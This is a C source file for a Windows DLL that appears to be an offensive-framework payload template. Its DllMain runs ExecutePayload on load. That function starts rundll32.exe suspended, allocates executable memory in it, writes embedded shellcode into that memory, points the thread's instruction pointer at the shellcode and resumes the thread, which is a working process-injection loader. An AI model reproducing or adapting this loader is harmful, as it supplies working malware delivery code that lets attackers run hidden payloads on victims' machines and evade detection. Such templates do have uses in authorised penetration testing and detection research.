#include <windows.h>
#include "template.h"

#if BUILDMODE == 2
/* hand-rolled bzero allows us to avoid including ms vc runtime */
void inline_bzero(void *p, size_t l)
{
	BYTE *q = (BYTE *)p;
	size_t x = 0;
	for (x = 0; x < l; x++)
		*(q++) = 0x00;
}

#endif


void ExecutePayload(void);

BOOL WINAPI
DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
	switch (dwReason)
	{
		case DLL_PROCESS_ATTACH:
			ExecutePayload();
			break;

		case DLL_PROCESS_DETACH:
			// Code to run when the DLL is freed
			break;

		case DLL_THREAD_ATTACH:
			// Code to run when a thread is created during the DLL's lifetime
			break;

		case DLL_THREAD_DETACH:
			// Code to run when a thread ends normally.
			break;
	}
	return TRUE;
}

BOOL Synchronize(void) {
	BOOL bResult = TRUE;
	BOOL bRelease = FALSE;
	HANDLE hSemaphore = NULL;
	HANDLE hEvent = NULL;
	SECURITY_ATTRIBUTES SecurityAttributes;

	SecurityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	SecurityAttributes.lpSecurityDescriptor = NULL;
	SecurityAttributes.bInheritHandle = TRUE;

	do {
		if ((hSemaphore = CreateSemaphoreA(&SecurityAttributes, 1, 1, szSyncNameS)) == NULL) {
			break;
		}

		bResult = FALSE;
		if (WaitForSingleObject(hSemaphore, 0) == WAIT_TIMEOUT) {
			break;
		}
		bRelease = TRUE;

		if (hEvent = OpenEventA(READ_CONTROL | SYNCHRONIZE, TRUE, szSyncNameE)) {
			// if the event already exists, do not continue
			CloseHandle(hEvent);
			break;
		}

		if (hEvent = CreateEventA(&SecurityAttributes, TRUE, TRUE, szSyncNameE)) {
			bResult = TRUE;
		}
	} while (FALSE);


	if (hSemaphore) {
		if (bRelease) {
			ReleaseSemaphore(hSemaphore, 1, NULL);
		}
		CloseHandle(hSemaphore);
	}
	// do not close the event handle (hEvent), it needs to be inherited
	return bResult;
}

void ExecutePayload(void) {
	int error;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	CONTEXT ctx;
	DWORD prot;
	LPVOID ep;

	// Start up the payload in a new process
	inline_bzero( &si, sizeof( si ));
	si.cb = sizeof(si);

	if (Synchronize()) {
		// Create a suspended process, write shellcode into stack, make stack RWX, resume it
		if (CreateProcess(NULL, "rundll32.exe", NULL, NULL, TRUE, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {
			ctx.ContextFlags = CONTEXT_INTEGER|CONTEXT_CONTROL;
			GetThreadContext(pi.hThread, &ctx);

			ep = (LPVOID) VirtualAllocEx(pi.hProcess, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

			WriteProcessMemory(pi.hProcess,(PVOID)ep, &code, SCSIZE, 0);

	#ifdef _WIN64
			ctx.Rip = (DWORD64)ep;
	#else
			ctx.Eip = (DWORD)ep;
	#endif

			SetThreadContext(pi.hThread,&ctx);

			ResumeThread(pi.hThread);
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
		}
	}
	ExitThread(0);
}
